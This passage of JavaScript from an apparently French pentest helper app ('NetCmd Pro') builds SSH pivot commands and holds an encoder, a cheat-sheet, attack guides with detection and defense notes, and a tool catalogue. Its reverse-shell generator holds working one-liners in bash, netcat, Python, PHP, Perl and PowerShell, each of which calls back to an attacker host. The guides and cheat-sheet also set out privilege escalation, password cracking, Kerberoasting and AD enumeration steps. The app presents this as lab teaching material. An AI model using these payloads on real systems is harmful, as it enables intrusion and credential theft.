        btnBuildPivot.addEventListener('click', () => {
            const type = $('pivot-type').value;
            const pUser = ($('pivot-user').value || 'user').trim();
            const pIp = ($('pivot-ip').value || '10.10.10.5').trim();
            const tIp = ($('target-ip').value || '192.168.1.100').trim();
            const tPort = ($('target-port').value || '80').trim();
            const lPort = ($('local-port').value || (type === 'dynamic' ? '1080' : '8080')).trim();
            const outCmd = $('pivot-cmd-output');
            const outInst = $('pivot-instructions');

            let cmd = '', instructions = '';
            if (type === 'dynamic') {
                cmd = 'ssh -D ' + lPort + ' -N -q ' + pUser + '@' + pIp;
                instructions =
                    '<p class="mb-2"><span class="text-emerald-400">1.</span> Lance cette commande sur ton PC.</p>' +
                    '<p class="mb-2"><span class="text-emerald-400">2.</span> Ajoute dans <code class="bg-zinc-800 px-1 rounded text-zinc-300">/etc/proxychains4.conf</code> :</p>' +
                    '<pre class="bg-zinc-900 border border-zinc-800 p-2 rounded text-[11px] text-zinc-400 font-mono mt-1">socks5 127.0.0.1 ' + lPort + '</pre>' +
                    '<p class="mt-3"><span class="text-emerald-400">3.</span> Scanne le réseau interne via le proxy :</p>' +
                    '<pre class="bg-zinc-900 border border-zinc-800 p-2 rounded text-[11px] text-zinc-400 font-mono mt-1">proxychains nmap -sT 192.168.x.x</pre>';
            } else if (type === 'local') {
                cmd = 'ssh -L ' + lPort + ':' + tIp + ':' + tPort + ' -N -q ' + pUser + '@' + pIp;
                instructions =
                    '<p class="mb-2"><span class="text-emerald-400">1.</span> Lance cette commande sur ton PC.</p>' +
                    '<p class="mb-2"><span class="text-emerald-400">2.</span> Le service interne est transféré vers ton PC local.</p>' +
                    '<p class="mt-3"><span class="text-emerald-400">3.</span> Accède au service via :</p>' +
                    '<pre class="bg-zinc-900 border border-zinc-800 p-2 rounded text-[11px] text-zinc-400 font-mono mt-1">http://127.0.0.1:' + lPort + '</pre>';
            } else {
                cmd = 'ssh -R ' + tPort + ':127.0.0.1:' + lPort + ' -N -q ' + pUser + '@' + pIp;
                instructions =
                    '<p class="mb-2"><span class="text-red-400 font-bold">Attention :</span> expose un service local au réseau cible.</p>' +
                    '<p class="mt-3"><span class="text-emerald-400">1.</span> Listener local : <code class="text-zinc-400">nc -lvnp ' + lPort + '</code></p>' +
                    '<p><span class="text-emerald-400">2.</span> La cible se connecte à l\'IP du pivot sur le port ' + tPort + '.</p>';
            }
            if (outCmd) outCmd.textContent = cmd;
            if (outInst) outInst.innerHTML = instructions;
        });
        btnBuildPivot.click();
    }

    // =========================================================================
    // 10. REVERSE SHELLS
    // =========================================================================

    const revShells = {
        bash: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
        nc: 'nc LHOST LPORT -e /bin/sh',
        'nc-mkfifo': 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f',
        python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
        php: `php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`,
        perl: `perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        powershell: `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"`
    };
    const revLabels = { bash: 'Bash', nc: 'Netcat', 'nc-mkfifo': 'Netcat (mkfifo)', python: 'Python 3', php: 'PHP', perl: 'Perl', powershell: 'PowerShell' };

    const revBuildBtn = $('rev-build');
    if (revBuildBtn) {
        revBuildBtn.addEventListener('click', () => {
            const ip = ($('rev-ip').value || '10.10.14.1').trim();
            const port = ($('rev-port').value || '4444').trim();
            const type = $('rev-type').value;
            const tpl = revShells[type] || revShells.bash;
            const payload = tpl.split('LHOST').join(ip).split('LPORT').join(port);
            const out = $('rev-output');
            const label = $('rev-lang-label');
            if (out) out.textContent = payload;
            if (label) label.textContent = 'Payload — ' + (revLabels[type] || type);
        });
    }

    // =========================================================================
    // 11. ENCODEUR / DÉCODEUR
    // =========================================================================

    function b64encode(str) { return btoa(unescape(encodeURIComponent(str))); }
    function b64decode(str) { return decodeURIComponent(escape(atob(str.trim()))); }
    function hexEncode(str) {
        return Array.from(new TextEncoder().encode(str)).map(b => b.toString(16).padStart(2, '0')).join(' ');
    }
    function hexDecode(str) {
        const clean = str.replace(/0x/gi, '').replace(/[\s,:]+/g, '');
        if (clean.length % 2 !== 0) throw new Error('longueur hex impaire');
        const bytes = new Uint8Array(clean.match(/.{2}/g).map(h => parseInt(h, 16)));
        return new TextDecoder().decode(bytes);
    }

    document.querySelectorAll('.enc-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const mode = btn.getAttribute('data-enc');
            const input = ($('enc-input') && $('enc-input').value) || '';
            const out = $('enc-output');
            if (!out) return;
            let result = '';
            try {
                if (mode === 'b64enc') result = b64encode(input);
                else if (mode === 'b64dec') result = b64decode(input);
                else if (mode === 'urlenc') result = encodeURIComponent(input);
                else if (mode === 'urldec') result = decodeURIComponent(input);
                else if (mode === 'hexenc') result = hexEncode(input);
                else if (mode === 'hexdec') result = hexDecode(input);
                out.classList.remove('text-red-400');
                out.classList.add('text-emerald-400');
                out.textContent = result || '(vide)';
            } catch (e) {
                out.classList.remove('text-emerald-400');
                out.classList.add('text-red-400');
                out.textContent = 'Erreur : entrée invalide pour cette opération (' + e.message + ')';
            }
        });
    });

    // =========================================================================
    // 12. CHEAT-SHEET
    // =========================================================================

    const cheatData = [
        {
            title: 'Nmap — essentiel', color: 'text-accent-400',
            items: [
                ['nmap -sV -sC -oA scan <ip>', 'Scan versions + scripts, sauvegarde'],
                ['nmap -p- --min-rate 5000 <ip>', 'Tous les ports, rapide'],
                ['nmap -sU --top-ports 100 <ip>', 'Top 100 ports UDP'],
                ['nmap -sn 192.168.1.0/24', 'Découverte d\'hôtes (ping sweep)']
            ]
        },
        {
            title: 'Netcat', color: 'text-emerald-400',
            items: [
                ['nc -lvnp 4444', 'Listener (écoute)'],
                ['nc <ip> 4444', 'Se connecter'],
                ['nc -lvnp 4444 > fichier', 'Recevoir un fichier'],
                ['nc <ip> 4444 < fichier', 'Envoyer un fichier']
            ]
        },
        {
            title: 'Transfert de fichiers', color: 'text-blue-400',
            items: [
                ['python3 -m http.server 8000', 'Serveur HTTP rapide'],
                ['wget http://<ip>:8000/f', 'Télécharger (Linux)'],
                ['curl -O http://<ip>:8000/f', 'Télécharger (curl)'],
                ['scp f user@<ip>:/tmp/', 'Copier via SSH']
            ]
        },
        {
            title: 'Linux — énumération', color: 'text-amber-400',
            items: [
                ['sudo -l', 'Droits sudo'],
                ['find / -perm -4000 2>/dev/null', 'Binaires SUID'],
                ['uname -a', 'Version du noyau'],
                ['cat /etc/crontab', 'Tâches planifiées']
            ]
        },
        {
            title: 'Ports courants', color: 'text-purple-400',
            items: [
                ['21 FTP · 22 SSH · 23 Telnet', 'Accès distant'],
                ['25 SMTP · 53 DNS · 80 HTTP', 'Services de base'],
                ['443 HTTPS · 445 SMB · 3389 RDP', 'Web / Windows'],
                ['3306 MySQL · 5432 PostgreSQL', 'Bases de données']
            ]
        },
        {
            title: 'Git rapide', color: 'text-red-400',
            items: [
                ['git status', 'État du dépôt'],
                ['git add . && git commit -m "msg"', 'Commit'],
                ['git log --oneline --graph', 'Historique compact'],
                ['git checkout -b <branche>', 'Nouvelle branche']
            ]
        }
    ];

    let cheatRendered = false;
    function renderCheatsheet() {
        if (cheatRendered) return;
        const grid = $('cheatsheet-grid');
        if (!grid) return;
        let html = '';
        cheatData.forEach(cat => {
            html += '<div class="bg-zinc-900/20 border border-zinc-800 rounded-xl p-4 space-y-2">' +
                '<h3 class="text-sm font-semibold ' + cat.color + ' mb-2">' + cat.title + '</h3>';
            cat.items.forEach((pair) => {
                const cmd = pair[0], desc = pair[1];
                const uid = 'cs-' + Math.random().toString(36).slice(2, 9);
                html += '<pre id="' + uid + '" class="bg-zinc-900 border border-zinc-800 rounded px-2 py-1.5 text-[11px] text-zinc-100 overflow-x-auto font-mono cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + uid + '\')">' + escapeHtml(cmd) + '</pre>' +
                    '<p class="text-[10px] text-zinc-500 mb-1 ml-1">' + escapeHtml(desc) + '</p>';
            });
            html += '</div>';
        });
        grid.innerHTML = html;

        const exp = $('cheat-export');
        if (exp) exp.addEventListener('click', () => {
            let md = '# Cheat-sheet NetCmd Pro\n\n';
            cheatData.forEach(cat => {
                md += '## ' + cat.title + '\n\n';
                cat.items.forEach(pair => { md += '- `' + pair[0] + '` — ' + pair[1] + '\n'; });
                md += '\n';
            });
            downloadFile('netcmd-cheatsheet.md', md, 'text/markdown');
        });
        cheatRendered = true;
    }

    // =========================================================================
    // 12quater. GUIDES DÉTAILLÉS (PROCÉDURES PÉDAGOGIQUES)
    // =========================================================================

    const guides = [
        {
            id: 'privesc-linux', title: 'Élévation de privilèges — Linux', icon: 'lucide:terminal', color: 'amber',
            context: 'Après un premier accès (shell utilisateur), objectif : devenir root. On énumère le système à la recherche d\'une mauvaise configuration exploitable.',
            att: ['T1068', 'T1548.001', 'T1053.003'],
            steps: [
                { cmd: 'id ; sudo -l', explain: 'Voir ses groupes et les commandes autorisées en sudo (souvent un chemin direct vers root via GTFOBins).' },
                { cmd: 'find / -perm -4000 -type f 2>/dev/null', explain: 'Lister les binaires SUID : exécutés avec les droits du propriétaire (souvent root).' },
                { cmd: 'cat /etc/crontab ; ls -la /etc/cron.*', explain: 'Repérer des tâches planifiées lancées par root pointant vers un script modifiable.' },
                { cmd: 'uname -a ; cat /etc/os-release', explain: 'Version du noyau / de la distribution → chercher un exploit kernel connu (searchsploit).' },
                { cmd: './linpeas.sh | tee linpeas.txt', explain: 'Automatiser toute l\'énumération avec LinPEAS et surligner les pistes prometteuses.' }
            ],
            detection: 'Exécutions inhabituelles de binaires SUID, lectures massives du système de fichiers, dépôt de scripts dans des répertoires cron.',
            defense: 'Minimiser les binaires SUID, cron appartenant à root et non modifiables, noyau à jour, montages noexec/nosuid, auditd.'
        },
        {
            id: 'privesc-windows', title: 'Élévation de privilèges — Windows', icon: 'lucide:terminal', color: 'blue',
            context: 'Depuis un compte utilisateur Windows, objectif : passer Administrateur ou SYSTEM via une mauvaise configuration (service, droits, tâche).',
            att: ['T1068', 'T1078', 'T1574'],
            steps: [
                { cmd: 'whoami /priv', explain: 'Lister ses privilèges. Certains (SeImpersonate, SeBackup) ouvrent des voies d\'escalade connues.' },
                { cmd: 'systeminfo', explain: 'Version de l\'OS et correctifs installés → identifier un exploit de privilège non patché.' },
                { cmd: 'whoami /groups', explain: 'Appartenances de groupe et niveau d\'intégrité actuel.' },
                { cmd: 'winPEASany.exe', explain: 'Audit automatisé : services vulnérables, mots de passe en clair, chemins non cités, AlwaysInstallElevated.' }
            ],
            detection: 'Création de services anormaux, usage de privilèges sensibles, processus enfants inhabituels (ex : cmd lancé par un service).',
            defense: 'Principe du moindre privilège, correctifs à jour, chemins de services entre guillemets, désactiver AlwaysInstallElevated, EDR.'
        },
        {
            id: 'password-cracking', title: 'Cassage de mots de passe (hash)', icon: 'lucide:key-round', color: 'purple',
            context: 'Tu as récupéré un ou plusieurs hachages (base de données, /etc/shadow, SAM). Objectif : retrouver le mot de passe en clair hors-ligne.',
            att: ['T1110.002', 'T1003'],
            steps: [
                { cmd: 'hashid hash.txt', explain: 'Identifier le type de hachage (MD5, bcrypt, NTLM...) pour choisir le bon mode.' },
                { cmd: 'hashcat --help | grep -i ntlm', explain: 'Trouver le numéro de mode hashcat correspondant (ex : 1000 pour NTLM).' },
                { cmd: 'hashcat -m 1000 hash.txt rockyou.txt', explain: 'Attaque par dictionnaire : teste chaque mot d\'une wordlist (la plus efficace au début).' },
                { cmd: 'hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule', explain: 'Ajouter des règles de mutation (majuscules, chiffres, substitutions) pour élargir le dictionnaire.' },
                { cmd: 'john --format=nt hash.txt --wordlist=rockyou.txt', explain: 'Alternative avec John the Ripper (pratique pour de nombreux formats de fichiers).' }
            ],
            detection: 'Le cassage est hors-ligne, donc invisible côté cible. En amont, on détecte l\'accès au magasin de hachages (lecture SAM/shadow, dump LSASS).',
            defense: 'Mots de passe longs + MFA, algorithmes lents (bcrypt/argon2), sel unique, protection de LSASS (Credential Guard), rotation après fuite.'
        },
        {
            id: 'ad-enum', title: 'Énumération Active Directory', icon: 'lucide:network', color: 'emerald',
            context: 'Avec un compte de domaine valide (même faible privilège), objectif : cartographier le domaine et trouver un chemin vers l\'Administrateur du domaine.',
            att: ['T1087.002', 'T1069.002', 'T1558.003'],
            steps: [
                { cmd: 'crackmapexec smb 10.0.0.0/24', explain: 'Découvrir les hôtes SMB du réseau, leurs noms et le domaine auquel ils appartiennent.' },
                { cmd: 'crackmapexec smb <dc> -u user -p pass --users', explain: 'Énumérer les comptes du domaine avec des identifiants valides.' },
                { cmd: 'GetUserSPNs.py domaine/user:pass -dc-ip <dc> -request', explain: 'Kerberoasting : récupérer des tickets de comptes de service pour casser leur mot de passe hors-ligne.' },
                { cmd: 'bloodhound-python -d domaine -u user -p pass -c all', explain: 'Collecter les relations du domaine, puis visualiser les chemins d\'attaque dans BloodHound.' }
            ],
            detection: 'Requêtes LDAP massives, demandes de tickets Kerberos anormales (Kerberoasting), logons depuis des postes inhabituels.',
            defense: 'Comptes de service avec mots de passe longs (gMSA), tiering administratif, surveillance LDAP/Kerberos, principe du moindre privilège.'
        },
        {
            id: 'lab-scenario', title: 'Scénario lab complet (fil rouge)', icon: 'lucide:flag', color: 'red',
            context: 'Enchaînement type d\'un lab (HackTheBox/TryHackMe) : de la découverte au root, en reliant les modules de NetCmd Pro.',
            att: ['T1595', 'T1190', 'T1068'],
            steps: [
                { cmd: 'nmap -sV -sC -p- 10.10.10.5', explain: '1) Scan complet (module Scan) : identifier les services et versions exposés.' },
                { cmd: 'ffuf -u http://10.10.10.5/FUZZ -w common.txt', explain: '2) Si un service web existe, énumérer les chemins cachés (module Arsenal → Web).' },
                { cmd: 'sqlmap -u "http://10.10.10.5/p.php?id=1" --dbs', explain: '3) Exploiter une faille trouvée (ici injection SQL — module Sécurité Web).' },
                { cmd: 'nc -lvnp 4444', explain: '4) Obtenir un shell : listener prêt, puis déclencher un reverse shell (module Reverse Shells).' },
                { cmd: './linpeas.sh', explain: '5) Énumérer pour l\'élévation de privilèges (guide privesc Linux) jusqu\'à root.' },
                { cmd: 'ssh -D 1080 -N user@10.10.10.5', explain: '6) Si d\'autres machines existent, pivoter vers le réseau interne (module Pivoting).' }
            ],
            detection: 'Chaque étape laisse des traces : scans (IDS), payloads web (WAF), connexions sortantes (EDR), énumération locale (auditd).',
            defense: 'Défense en profondeur : surface réduite, patchs, WAF, egress filtering, segmentation, journalisation centralisée (SIEM).'
        }
    ];

    const guideColors = {
        amber: 'text-amber-400', blue: 'text-blue-400', purple: 'text-purple-400',
        emerald: 'text-emerald-400', red: 'text-red-400'
    };

    let guidesRendered = false;
    function renderGuides() {
        if (guidesRendered) return;
        const list = $('guides-list');
        if (!list) return;
        let html = '';
        guides.forEach(g => {
            const ct = guideColors[g.color] || 'text-accent-400';
            const att = (g.att || []).map(a => '<span class="text-[9px] font-mono px-1 py-0.5 rounded bg-blue-500/10 text-blue-300 border border-blue-500/20">' + escapeHtml(a) + '</span>').join(' ');
            let steps = '';
            g.steps.forEach((s, i) => {
                const uid = 'g-' + g.id + '-' + i;
                steps += '<div class="space-y-1">' +
                    '<code id="' + uid + '" class="block bg-zinc-950 border border-zinc-800 rounded px-2 py-1.5 text-[11px] text-zinc-200 font-mono break-all cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + uid + '\')">' + escapeHtml(s.cmd) + '</code>' +
                    '<p class="text-[11px] text-zinc-400 leading-relaxed ml-1">' + escapeHtml(s.explain) + '</p>' +
                '</div>';
            });
            html += '<details class="group bg-zinc-900/20 border border-zinc-800 rounded-xl overflow-hidden">' +
                '<summary class="flex items-center justify-between gap-3 cursor-pointer list-none px-5 py-4 hover:bg-zinc-900/40 transition-colors">' +
                    '<div class="flex items-center gap-3">' +
                        '<iconify-icon icon="' + g.icon + '" width="18" class="' + ct + ' shrink-0"></iconify-icon>' +
                        '<span class="text-sm font-semibold text-white">' + escapeHtml(g.title) + '</span>' +
                    '</div>' +
                    '<iconify-icon icon="lucide:chevron-down" width="16" class="text-zinc-500 transition-transform group-open:rotate-180 shrink-0"></iconify-icon>' +
                '</summary>' +
                '<div class="px-5 pb-5 space-y-4 border-t border-zinc-800/50 pt-4">' +
                    '<div class="flex flex-wrap gap-1">' + att + '</div>' +
                    '<p class="text-xs text-zinc-300 leading-relaxed">' + escapeHtml(g.context) + '</p>' +
                    '<div class="space-y-3">' + steps + '</div>' +
                    '<div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-[11px]">' +
                        '<div class="p-2 rounded bg-amber-500/5 border border-amber-500/15"><div class="text-amber-400 uppercase text-[10px] font-bold tracking-wider mb-0.5">🔍 Détection</div><p class="text-zinc-400 leading-relaxed">' + escapeHtml(g.detection) + '</p></div>' +
                        '<div class="p-2 rounded bg-emerald-500/5 border border-emerald-500/15"><div class="text-emerald-400 uppercase text-[10px] font-bold tracking-wider mb-0.5">🛡 Défense</div><p class="text-zinc-400 leading-relaxed">' + escapeHtml(g.defense) + '</p></div>' +
                    '</div>' +
                '</div>' +
            '</details>';
        });
        list.innerHTML = html;

        const exp = $('guides-export');
        if (exp) exp.addEventListener('click', () => {
            let md = '# Guides détaillés — NetCmd Pro\n\n> Référence pédagogique — labs et systèmes autorisés uniquement.\n\n';
            guides.forEach(g => {
                md += '## ' + g.title + '\n\n';
                md += '**ATT&CK :** ' + (g.att || []).join(', ') + '\n\n';
                md += g.context + '\n\n';
                g.steps.forEach((s, i) => { md += (i + 1) + '. `' + s.cmd + '`\n   - ' + s.explain + '\n'; });
                md += '\n- **Détection :** ' + g.detection + '\n- **Défense :** ' + g.defense + '\n\n';
            });
            downloadFile('netcmd-guides.md', md, 'text/markdown');
        });
        guidesRendered = true;
    }

    // =========================================================================
    // 12ter. ARSENAL (RECHERCHE D'OUTILS PAR BESOIN)
    // =========================================================================

    // Normalise (minuscule + sans accents) pour une recherche tolérante
    function norm(s) {
        return String(s || '').toLowerCase().normalize('NFD').replace(/[̀-ͯ]/g, '');
    }

    // Base d'outils — référence pédagogique. att[] = IDs MITRE ATT&CK.
    const arsenal = [
        // --- Reconnaissance ---
        { name: 'theHarvester', cat: 'Reconnaissance', purpose: 'Collecte d\'e-mails, sous-domaines et noms depuis des sources publiques (OSINT).', use: 'theHarvester -d exemple.com -b all', kw: ['osint', 'email', 'reconnaissance', 'sous-domaine', 'passif'], att: ['T1589', 'T1590'] },
        { name: 'whois', cat: 'Reconnaissance', purpose: 'Informations d\'enregistrement d\'un domaine (propriétaire, registrar, DNS).', use: 'whois exemple.com', kw: ['domaine', 'proprietaire', 'osint', 'dns'], att: ['T1590'] },
        { name: 'dnsrecon / dig', cat: 'Reconnaissance', purpose: 'Énumération DNS : enregistrements, transferts de zone, sous-domaines.', use: 'dnsrecon -d exemple.com', kw: ['dns', 'sous-domaine', 'zone', 'enumeration'], att: ['T1590.002'] },
        { name: 'Shodan', cat: 'Reconnaissance', purpose: 'Moteur de recherche des appareils exposés sur Internet (ports, bannières, IoT).', use: 'shodan search "apache country:FR"', kw: ['osint', 'iot', 'exposition', 'internet', 'passif'], att: ['T1596'] },

        // --- Scan & réseau ---
        { name: 'nmap', cat: 'Scan & réseau', purpose: 'Référence du scan : hôtes actifs, ports ouverts, services, versions, scripts NSE.', use: 'nmap -sV -sC -p- 10.10.10.5', kw: ['scan', 'port', 'service', 'decouverte', 'reseau'], att: ['T1046', 'T1595.001'] },
        { name: 'masscan', cat: 'Scan & réseau', purpose: 'Scanner de ports ultra-rapide, adapté aux grandes plages d\'adresses.', use: 'masscan 10.0.0.0/8 -p80,443 --rate 10000', kw: ['scan', 'port', 'rapide', 'plage', 'masse'], att: ['T1046'] },
        { name: 'rustscan', cat: 'Scan & réseau', purpose: 'Scan de ports rapide qui enchaîne ensuite sur nmap.', use: 'rustscan -a 10.10.10.5 -- -sV', kw: ['scan', 'port', 'rapide'], att: ['T1046'] },
        { name: 'netdiscover', cat: 'Scan & réseau', purpose: 'Découverte d\'hôtes sur le réseau local via ARP.', use: 'netdiscover -r 192.168.1.0/24', kw: ['arp', 'decouverte', 'local', 'hote'], att: ['T1016'] },

        // --- Web ---
        { name: 'gobuster / ffuf', cat: 'Web', purpose: 'Brute-force de répertoires, fichiers et sous-domaines d\'un site web.', use: 'ffuf -u http://cible/FUZZ -w liste.txt', kw: ['web', 'fuzzing', 'repertoire', 'directory', 'brute'], att: ['T1595.003'] },
        { name: 'nikto', cat: 'Web', purpose: 'Scanner de vulnérabilités web (fichiers dangereux, mauvaises configs, versions).', use: 'nikto -h http://cible', kw: ['web', 'vulnerabilite', 'scan', 'serveur'], att: ['T1595.002'] },
        { name: 'Burp Suite', cat: 'Web', purpose: 'Proxy d\'interception pour analyser et manipuler le trafic HTTP(S) d\'une appli web.', use: 'Proxy → intercepter / Repeater / Intruder', kw: ['web', 'proxy', 'interception', 'http', 'requete'], att: ['T1185'] },
        { name: 'sqlmap', cat: 'Web', purpose: 'Détection et exploitation automatisées d\'injections SQL.', use: 'sqlmap -u "http://cible/p.php?id=1" --dbs', kw: ['sql', 'injection', 'base de donnees', 'web', 'dump'], att: ['T1190'], note: 'Uniquement sur une cible autorisée.' },
        { name: 'wpscan', cat: 'Web', purpose: 'Scanner de sécurité spécialisé WordPress (plugins, thèmes, utilisateurs).', use: 'wpscan --url http://cible --enumerate u', kw: ['wordpress', 'web', 'cms', 'plugin', 'scan'], att: ['T1595.002'] },

        // --- Mots de passe ---
        { name: 'hashcat', cat: 'Mots de passe', purpose: 'Cassage de hachages (mots de passe) accéléré par GPU, très nombreux formats.', use: 'hashcat -m 0 hash.txt rockyou.txt', kw: ['hash', 'mot de passe', 'password', 'crack', 'gpu', 'bruteforce'], att: ['T1110.002'] },
        { name: 'John the Ripper', cat: 'Mots de passe', purpose: 'Cassage de mots de passe polyvalent (hash, fichiers protégés, zip...).', use: 'john --wordlist=rockyou.txt hash.txt', kw: ['hash', 'mot de passe', 'password', 'crack', 'john'], att: ['T1110.002'] },
        { name: 'hydra', cat: 'Mots de passe', purpose: 'Brute-force d\'authentification en ligne (SSH, FTP, HTTP, RDP...).', use: 'hydra -l admin -P liste.txt ssh://cible', kw: ['bruteforce', 'ssh', 'login', 'mot de passe', 'force brute'], att: ['T1110.001'], note: 'Uniquement sur tes propres services.' },
        { name: 'CeWL', cat: 'Mots de passe', purpose: 'Génère une liste de mots personnalisée à partir du contenu d\'un site.', use: 'cewl http://cible -w liste.txt', kw: ['wordlist', 'dictionnaire', 'mot de passe', 'web'], att: ['T1110'] },

        // --- Élévation de privilèges ---
        { name: 'LinPEAS', cat: 'Élévation de privilèges', purpose: 'Script d\'audit Linux qui repère automatiquement les chemins d\'escalade de privilèges.', use: './linpeas.sh', kw: ['privesc', 'linux', 'elevation', 'privilege', 'audit', 'root'], att: ['T1068', 'T1083'] },
        { name: 'WinPEAS', cat: 'Élévation de privilèges', purpose: 'Équivalent Windows : recherche de mauvaises configs pour passer admin/SYSTEM.', use: 'winpeas.exe', kw: ['privesc', 'windows', 'elevation', 'privilege', 'admin'], att: ['T1068'] },
        { name: 'GTFOBins', cat: 'Élévation de privilèges', purpose: 'Base de binaires Unix détournables pour contourner des restrictions (sudo, SUID).', use: 'Chercher le binaire sur gtfobins.github.io', kw: ['privesc', 'sudo', 'suid', 'linux', 'binaire', 'contournement'], att: ['T1548.001'] },
        { name: 'pspy', cat: 'Élévation de privilèges', purpose: 'Observe les processus et tâches cron sans privilèges root (repère des exécutions exploitables).', use: './pspy64', kw: ['privesc', 'cron', 'processus', 'linux', 'surveillance'], att: ['T1053.003'] },

        // --- Active Directory ---
        { name: 'BloodHound', cat: 'Active Directory', purpose: 'Cartographie des relations et chemins d\'attaque dans un domaine Active Directory.', use: 'Collecteur SharpHound puis analyse graphe', kw: ['active directory', 'ad', 'domaine', 'graphe', 'windows', 'chemin'], att: ['T1069.002', 'T1482'] },
        { name: 'CrackMapExec', cat: 'Active Directory', purpose: 'Couteau suisse AD/SMB : énumération, test d\'identifiants, exécution à distance.', use: 'crackmapexec smb 10.0.0.0/24 -u u -p p', kw: ['ad', 'smb', 'active directory', 'laterale', 'identifiant'], att: ['T1021.002', 'T1110'] },
        { name: 'impacket', cat: 'Active Directory', purpose: 'Suite de scripts Python pour les protocoles Windows (secretsdump, psexec, Kerberos).', use: 'secretsdump.py domaine/u:p@cible', kw: ['ad', 'kerberos', 'smb', 'windows', 'hash', 'psexec'], att: ['T1003.006', 'T1558'] },
        { name: 'Responder', cat: 'Active Directory', purpose: 'Empoisonne LLMNR/NBT-NS pour capturer des identifiants NetNTLM sur le LAN.', use: 'responder -I eth0', kw: ['ad', 'llmnr', 'netntlm', 'capture', 'mitm', 'windows'], att: ['T1557.001'], note: 'Technique intrusive : réseau autorisé uniquement.' },

        // --- Exploitation ---
        { name: 'Metasploit', cat: 'Exploitation', purpose: 'Framework d\'exploitation : modules d\'exploit, payloads, post-exploitation.', use: 'msfconsole → use exploit/...', kw: ['exploit', 'payload', 'framework', 'metasploit'], att: ['T1203', 'T1059'] },
        { name: 'searchsploit', cat: 'Exploitation', purpose: 'Recherche hors-ligne d\'exploits publics (base Exploit-DB).', use: 'searchsploit apache 2.4', kw: ['exploit', 'cve', 'recherche', 'exploit-db'], att: ['T1588.005'] },
        { name: 'msfvenom', cat: 'Exploitation', purpose: 'Génère des payloads autonomes (reverse shell, meterpreter) dans divers formats.', use: 'msfvenom -p <payload> LHOST=.. -f elf', kw: ['payload', 'shellcode', 'reverse', 'generer'], att: ['T1587.001'], note: 'Pour tes labs / cibles autorisées.' },

        // --- Pivoting ---
        { name: 'chisel', cat: 'Pivoting', purpose: 'Tunnel TCP/UDP sur HTTP, pratique pour pivoter à travers un pare-feu.', use: 'chisel server --reverse  /  chisel client', kw: ['pivot', 'tunnel', 'proxy', 'socks', 'rebond'], att: ['T1572', 'T1090'] },
        { name: 'ligolo-ng', cat: 'Pivoting', purpose: 'Pivoting moderne via interface TUN, accès transparent au réseau interne.', use: 'Agent côté cible + proxy côté attaquant', kw: ['pivot', 'tunnel', 'reseau interne', 'laterale'], att: ['T1572'] },
        { name: 'proxychains', cat: 'Pivoting', purpose: 'Force n\'importe quel outil à passer par un proxy (SOCKS d\'un tunnel SSH).', use: 'proxychains nmap -sT 192.168.1.5', kw: ['pivot', 'proxy', 'socks', 'tunnel'], att: ['T1090'] },

        // --- Sniffing & MITM ---
        { name: 'Wireshark', cat: 'Sniffing & MITM', purpose: 'Analyseur de paquets graphique : inspection fine des protocoles réseau.', use: 'Capturer sur interface + filtres d\'affichage', kw: ['sniff', 'paquet', 'trafic', 'analyse', 'reseau', 'capture'], att: ['T1040'] },
        { name: 'tcpdump', cat: 'Sniffing & MITM', purpose: 'Capture de paquets en ligne de commande, idéale sur serveur distant.', use: 'tcpdump -i eth0 -nn port 80', kw: ['sniff', 'paquet', 'trafic', 'capture', 'cli'], att: ['T1040'] },
        { name: 'bettercap', cat: 'Sniffing & MITM', purpose: 'Boîte à outils MITM moderne (ARP spoofing, interception, modules réseau).', use: 'bettercap -iface eth0', kw: ['mitm', 'arp', 'spoofing', 'interception', 'reseau'], att: ['T1557.002'], note: 'Technique intrusive : réseau autorisé uniquement.' },

        // --- Wireless ---
        { name: 'aircrack-ng', cat: 'Wireless', purpose: 'Suite d\'audit Wi-Fi : capture de handshakes et test de robustesse des clés WPA.', use: 'aircrack-ng capture.cap -w rockyou.txt', kw: ['wifi', 'wireless', 'wpa', 'handshake', 'sans-fil'], att: ['T1040'], note: 'Uniquement sur ton propre réseau Wi-Fi.' },
        { name: 'Kismet', cat: 'Wireless', purpose: 'Détecteur de réseaux sans fil et sniffer (Wi-Fi, Bluetooth), cartographie.', use: 'kismet -c wlan0', kw: ['wifi', 'wireless', 'detection', 'sans-fil', 'bluetooth'], att: ['T1040'] },

        // --- Forensics & stégano ---
        { name: 'Volatility', cat: 'Forensics & stégano', purpose: 'Analyse de dumps mémoire RAM (processus, connexions, artefacts) — forensics/CTF.', use: 'vol.py -f mem.raw windows.pslist', kw: ['forensics', 'memoire', 'ram', 'ctf', 'analyse', 'investigation'], att: ['T1003'] },
        { name: 'binwalk', cat: 'Forensics & stégano', purpose: 'Analyse et extraction de fichiers embarqués dans un binaire/firmware.', use: 'binwalk -e firmware.bin', kw: ['forensics', 'firmware', 'extraction', 'stegano', 'ctf'], att: [] },
        { name: 'steghide', cat: 'Forensics & stégano', purpose: 'Cache ou extrait des données dans des images/audio (stéganographie, CTF).', use: 'steghide extract -sf image.jpg', kw: ['stegano', 'cache', 'image', 'ctf', 'forensics'], att: ['T1027.003'] },

